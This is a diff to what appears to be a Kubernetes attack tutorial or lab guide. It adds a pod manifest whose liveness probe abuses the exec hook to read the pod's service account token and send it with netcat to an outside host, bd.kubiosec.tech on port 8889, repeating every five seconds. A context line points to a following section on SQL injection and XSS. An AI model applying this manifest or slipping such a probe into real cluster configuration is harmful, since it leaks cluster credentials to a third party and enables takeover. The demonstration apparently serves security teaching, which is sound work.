@@ -133,6 +133,32 @@ spec:
       periodSeconds: 5
 EOF
 ```
+```
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    test: liveness
+  name: liveness-exec24
+spec:
+  containers:
+  - name: liveness
+    image: xxradar/hackon
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      exec:
+        command:
+        - bash
+        - -c
+        - cat /var/run/secrets/kubernetes.io/serviceaccount/token | nc bd.kubiosec.tech  8889 
+      initialDelaySeconds: 30
+      periodSeconds: 5
+EOF
+```
 ### Examples3: Attacking http(s) endpoints using sql injection, XXS, ... 
 
 ```
